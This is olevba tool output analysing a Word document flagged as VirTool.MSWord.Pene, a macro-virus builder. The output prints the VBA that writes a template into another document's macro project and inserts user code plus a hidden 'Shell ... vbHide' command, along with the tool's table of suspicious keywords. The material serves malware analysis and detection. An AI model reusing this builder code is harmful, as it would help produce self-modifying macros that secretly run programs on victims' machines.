olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Instructor.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Instructor.frm 
in file: VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4 - OLE stream: 'Macros/VBA/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
On Error GoTo RepErr
Restart:
Penetr = InputBox("Where is the file 'Penetrator.bas' ?")
If Penetr = "" Then Exit Sub
IsHere = Dir(Penetr & "\Penetrator.bas")
If UCase(IsHere) <> "PENETRATOR.BAS" Then
    MsgBox Penetr & "\Penetrator.bas" & Chr(13) & "file not found"
    GoTo Restart
End If
Set Penetrator = Documents("Penetrator.doc").VBProject.VBComponents(1).CodeModule
Penetrator.DeleteLines 1, Penetrator.CountOfLines
Penetrator.AddFromFile (Penetr & "\Penetrator.bas")
For i = 1 To Penetrator.CountOfLines
    If Left(Penetrator.Lines(i, 1), 3) = "'UC" Then
        Penetrator.InsertLines i + 1, Instructor.userCode.Text
    ElseIf Left(Penetrator.Lines(i, 1), 3) = "'SP" Then
        Penetrator.InsertLines i + 1, "Shell " & Instructor.userProggy.Text & ", vbHide"
    End If
Next i
Exit Sub
RepErr:
MsgBox Err.Description
MsgBox "Make sure that you loaded a file called 'Penetrator.doc' !!"
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�individual code: (leave it like it is, if you don't know how to use it)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�path and program name:F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Setup
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�by Lord Arz       Lord_Arz@gmx.net
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'userCode'" IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Rem'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'userProggy'" IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'VirTool.MSWord.Pene-57164d295a513fda064a26568798e80c06b0d6f4' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

